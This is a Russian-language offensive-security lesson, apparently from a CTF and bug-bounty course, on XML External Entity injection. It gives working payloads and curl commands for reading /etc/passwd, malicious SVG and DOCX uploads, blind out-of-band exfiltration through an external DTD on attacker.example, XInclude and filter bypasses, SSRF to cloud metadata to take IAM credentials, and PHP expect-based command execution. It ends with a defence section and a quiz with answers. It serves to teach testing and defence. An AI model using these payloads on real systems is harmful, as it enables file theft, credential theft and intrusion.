---
id: web-xxe
title: "XXE: XML External Entity Injection"
category: web
parent: web-ssrf-core
difficulty: medium
order: 1
tags: [xxe, xml, external-entity, ssrf, file-read, blind]
prerequisites: [web-ssrf]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 40
summary: "Как эксплуатировать XML External Entity: чтение файлов, SSRF, blind-эксфильтрация и обход фильтров."
---
XXE (XML External Entity Injection) — это инъекция внешних сущностей XML. XML-парсер умеет объявлять сущности, в том числе **внешние** — ссылающиеся на файлы или URL. Если парсер обрабатывает недоверенный XML и не запрещает внешние сущности, атакующий читает локальные файлы (LFI), делает SSRF и в ряде случаев добивается RCE. XXE особенно коварен тем, что прячется в «безобидных» форматах: SVG, DOCX, XLSX, RSS, SOAP, SAML.

## Теория: как устроены XML-сущности

XML позволяет объявлять сущности в DTD (Document Type Definition):

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY myentity "значение">
]>
<root>&myentity;</root>
```

Внешняя сущность ссылается на файл или URL через `SYSTEM`:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

При подстановке `&xxe;` парсер читает файл и вставляет содержимое в документ. Если содержимое попадает в ответ — это classic (in-band) XXE. Если нет — blind XXE (через внешний DTD и OOB).

## Инструменты: ручные payload, внешний DTD, OOB

- **curl/Burp** — ручная доставка XML.
- **Collaborator/OOB-листенер** — подтверждение blind XXE.
- **`xmllint`/`python -c`** — локальная проверка payload.
- **xxe-exploit / xxeserv** — серверы внешних DTD.

```bash
# classic: читаем файл в ответ
curl -s -X POST https://app.example/api \
  -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
```

## Разобранный пример: XXE в загрузке SVG → чтение файла и SSRF

SVG — это XML, и его часто загружают как «картинку». Внутри можно объявить сущность:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
```

```bash
curl -s -F 'file=@evil.svg;type=image/svg+xml' https://app.example/upload
# если сервер возвращает отрендеренный SVG/превью -> содержимое /etc/passwd
```

Тот же приём с `http://169.254.169.254/latest/meta-data/` даёт SSRF в облачные метаданные.

## Разобранный пример: blind XXE с внешним DTD

Когда вывод не возвращается, используем внешний DTD и параметрические сущности, чтобы эксфильтровать файл через OOB:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd">
  %dtd;
]>
<r>&send;</r>
```

`evil.dtd` на нашем сервере:

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.example/?%file;'>">
%all;
```

Разбор: `%file;` читает файл, `%all;` определяет сущность `send`, ссылающуюся на наш сервер с содержимым файла в query. Сервер делает запрос → мы видим данные. Параметрические сущности (`%`) нужны, потому что их можно использовать внутри DTD.

## Разобранный пример: XInclude (когда DOCTYPE запрещён)

Если парсер запрещает `<!DOCTYPE`/внешние сущности, но поддерживает XInclude:

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

```bash
curl -s -X POST https://app.example/api -H 'Content-Type: application/xml' \
  --data-binary '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>'
```

Это LFI без внешних сущностей — важный обход, когда DOCTYPE отключён.

## Разобранный пример: XXE → SSRF → cloud metadata

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<r>&x;</r>
```

Если ответ возвращает роль, дальше запрашиваем креды:

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE">]>
<r>&x;</r>
```

Так XXE превращается в кражу облачных ключей (см. `playbook-cloud`).

## Разобранный пример: XXE → RCE (PHP expect)

На старых PHP с модулем `expect`:

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "expect://id">]>
<r>&x;</r>
```

Редко, но встречается. Чаще RCE через XXE не прямой, а цепочкой: XXE → SSRF → внутренний сервис (Redis) → RCE.

## Обход фильтров XXE

- **`<!ENTITY`/`<!DOCTYPE` фильтруется** → используйте UTF-16/UTF-7-кодировку, XInclude, или DTD через `SYSTEM`-инструкцию в начале.
- **«SYSTEM» фильтруется** → `PUBLIC`, кодирование, регистр.
- **Внешние сущности отключены** → XInclude, или SSRF через `document()`/`xml-stylesheet`.
- **WAF по `file://`** → `file:///etc/passwd` через `php://filter` (base64), `gopher://`, `jar://`.
- **Формат не XML на вид** → DOCX/XLSX/SVG/SAML — это XML внутри.

## Типичные ошибки новичков

- **Пробовать только JSON-эндпоинты.** Смените Content-Type на `application/xml`.
- **Забыть про SVG/DOCX.** XXE прячется в загрузках.
- **Не настроить OOB.** Blind XXE требует внешний DTD и листенер.
- **Путать XXE и XSLT.** Разные механизмы (`web-ssi-xslt-injection`).
- **Игнорировать XInclude.** Работает, когда DOCTYPE запрещён.
- **Считать «нет вывода = нет XXE».** Blind XXE — норма.

## Что делать дальше / решение

1. Найдите XML-вход (смените Content-Type, поищите загрузки SVG/DOCX/SAML).
2. Попробуйте classic XXE (файл в ответ).
3. Нет вывода → blind XXE с внешним DTD и OOB.
4. DOCTYPE запрещён → XInclude.
5. XXE есть → эскалируйте в SSRF (метаданные/внутренние сервисы) и, если повезёт, в RCE.
6. Артефакт — содержимое файла/креды. Тупик → `web-ssrf-core`, `web-saml-deep`.

## Справочная таблица

| Вектор | Payload | Результат |
|--------|---------|-----------|
| classic file | `<!ENTITY x SYSTEM "file:///etc/passwd">` | LFI |
| classic SSRF | `SYSTEM "http://127.0.0.1:6379/"` | SSRF |
| blind OOB | внешний DTD + `%file;` | exfil |
| XInclude | `<xi:include href="file://...">` | LFI без DOCTYPE |
| cloud meta | `http://169.254.169.254/...` | креды |
| PHP filter | `php://filter/convert.base64-encode/resource=` | обход |
## Практический чек-лист и разбор CTF-кейса

Сценарий: приложение принимает SAML-ответ или «импорт» XML и парсит его, но в ответ ничего из сущностей не отражает. Задача — прочитать `/etc/passwd` вслепую.

Пошагово:

1. **Подтвердите XML-парсинг.** Подайте невалидный XML и посмотрите на ошибку парсера — это доказывает, что вход разбирается.
2. **Попробуйте classic.** Вставьте `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>` и поищите содержимое в ответе/ошибке.
3. **Нет вывода — blind.** Объявите параметрические сущности и внешний DTD на своём сервере: `<!ENTITY % file SYSTEM "file:///etc/passwd">` + `<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">` + `%dtd;`.
4. **Поднимите evil.dtd** на атакующем хосте с содержимым, определяющим сущность `send`, ссылающуюся на ваш листенер с `%file;`.
5. **Наблюдайте OOB-запрос.** В логах листенера увидите URL с содержимым файла (часто base64-обрезанным).
6. **Обойдите запрет DOCTYPE.** Используйте XInclude: `<xi:include href="file:///etc/passwd" parse="text"/>`.
7. **Эскалируйте в SSRF.** Замените файл на `http://169.254.169.254/...` — получите облачные креды.
8. **Докажите артефактом.** Содержимое файла/креды — это подтверждение; «DOCTYPE принят» — нет.

Тонкость blind XXE: `%file;` нельзя использовать напрямую в теле документа (параметрические сущности работают только внутри DTD), поэтому и нужен внешний DTD — он «собирает» обычную сущность из параметрической.

## Защита XXE и её обход

Правильно: полностью отключать внешние сущности и DTD в парсере (`XMLConstants.FEATURE_SECURE_PROCESSING`, `resolve_entities=False`, `LIBXML_NOENT` не ставить, `defusedxml` в Python), запрещать `XInclude`. Обходы слабых защит:

- **Отключены только внешние сущности, но XInclude включён** → используйте XInclude.
- **Запрещён `<!DOCTYPE`, но парсер принимает `xml-stylesheet`** → XSLT-вектор (`web-ssi-xslt-injection`).
- **Фильтр по `SYSTEM`** → UTF-16/UTF-7 кодирование документа, `PUBLIC` вместо `SYSTEM`.
- **Фильтр по `file://`** → `php://filter/convert.base64-encode/resource=/etc/passwd`, `jar://`, `gopher://`.
- **«Только JSON»** → смените Content-Type на `application/xml`, `text/xml`, `application/soap+xml`; попробуйте SVG/DOCX.

## Смежные темы

- **`web-ssrf-core`**, **`web-ssrf-cloud-deep`** — SSRF-эскалация из XXE.
- **`web-saml-deep`**, **`web-oauth-oidc-saml`** — SAML, где XXE частый побочный вектор.
- **`web-ssi-xslt-injection`** — XSLT/XInclude-родственник.
- **`web-file-upload`** — SVG/DOCX как носители XXE.

## Итог

XXE — это «маленькая дверь в большой мир»: чтение файлов, SSRF, кража облачных ключей и иногда RCE. Он прячется в форматах, которые выглядят как данные, а не как код: SVG, DOCX, XLSX, RSS, SAML. Поэтому правило простое: **любой XML-вход — это кандидат на XXE**, и проверять его надо и в classic, и в blind-варианте.
## Разобранный пример: XXE в DOCX/XLSX

Форматы Office (DOCX, XLSX, PPTX) — это ZIP-архивы с XML внутри. Если приложение парсит загруженный документ XML-парсером, внешние сущности срабатывают. Проверка:

```bash
# распаковываем DOCX, правим word/document.xml, добавляем DOCTYPE+сущность
mkdir docx && cd docx && unzip ../sample.docx
# в word/document.xml вставляем:
#   <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
#   и используем &x; в тексте
zip -r ../evil.docx . && cd ..
curl -s -F 'file=@evil.docx' https://app.example/import
```

Если приложение возвращает «текст документа» или превью — увидите содержимое файла. Тот же приём работает для XLSX (`xl/sharedStrings.xml`) и SVG. Ключ в том, что фильтр по расширению (`.docx`) пропускает архив, а внутри — вредоносный XML.

## Определение XXE по ошибкам парсера

Ошибки парсера — лучший друг при blind XXE. Разные сообщения говорят о разном:

- `DOCTYPE is disallowed` → внешние сущности запрещены, пробуйте XInclude.
- `Entity 'x' not defined` → сущности не подставляются, но парсер их «видит».
- `failed to load external entity "file:///etc/passwd"` → **сущности работают**, просто файл не прочитан (путь/права).
- `connection refused` в ответе → SSRF через сущность работает.
- `Access is denied` → файл существует, но нет прав.

По этим сообщениям можно восстановить структуру защиты и выбрать обход. Например, `DOCTYPE is disallowed` сразу переводит нас на XInclude-ветку, а `failed to load external entity` означает, что надо просто уточнить путь.

## Итог

XXE остаётся актуальным, потому что XML никуда не ушёл: SAML, SOAP, RSS, SVG, Office-документы, конфиги. Защита (`defusedxml`, отключение сущностей) помогает, но применяется не везде, а обходы (XInclude, кодировки, смена формата) почти всегда находят лазейку. Методология: подтвердить XML-парсинг → classic → blind (внешний DTD) → XInclude → SSRF → артефакт. И помните: «нет вывода» — это не «нет XXE», а приглашение к blind-варианту.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что объявляет внешнюю сущность в XML?"
  options:
    - "`<!ENTITY xxe SYSTEM "file:///etc/passwd">`"
    - "`<external src="...">`"
    - "`<?xml include?>`"
    - "`<link href="...">`"
  answer: 0
  explanation: "`SYSTEM` указывает на внешний ресурс."
- question: "Как эксплуатировать blind XXE без видимого вывода?"
  options:
    - "Никак"
    - "Внешний DTD + OOB-эксфильтрация на ваш сервер"
    - "Запустить nmap"
    - "Изменить User-Agent"
  answer: 1
  explanation: "Данные уходят запросом на ваш сервер."
- question: "В каком формате загрузки файлов часто прячется XXE?"
  options:
    - "JPG"
    - "SVG и DOCX/XLSX (XML внутри)"
    - "TXT"
    - "MP4"
  answer: 1
  explanation: "Это XML-содержимое."
- question: "Какая директива даёт чтение файла, если DOCTYPE отключён, но включён XInclude?"
  options:
    - "`<xi:include href="file:///etc/passwd" parse="text"/>`"
    - "`<include src="...">`"
    - "`<entity>`"
    - "`<file read="...">`"
  answer: 0
  explanation: "XInclude — альтернативный механизм включения."
- question: "Какой протокол часто используют для эксфильтрации больших файлов через blind XXE?"
  options:
    - "HTTP"
    - "FTP"
    - "SMTP"
    - "ICMP"
  answer: 1
  explanation: "FTP позволяет отдать много данных одним соединением."
```

## Где пригодится

- **CTF (Web):** XXE — прямой путь к чтению флага/конфигов и SSRF; часто в задачах на XML-импорт/SOAP.
- **Bug bounty:** XXE в SAML/API — critical; blind XXE тоже высоко ценится.
- **Пентест:** проверка всех XML-эндпоинтов и загрузок SVG/DOCX входит в чеклист.
- **Работа (AppSec):** отключение внешних сущностей (`disallow-doctype-decl`, `XMLConstants.FEATURE_SECURE_PROCESSING`) — базовая мера защиты.
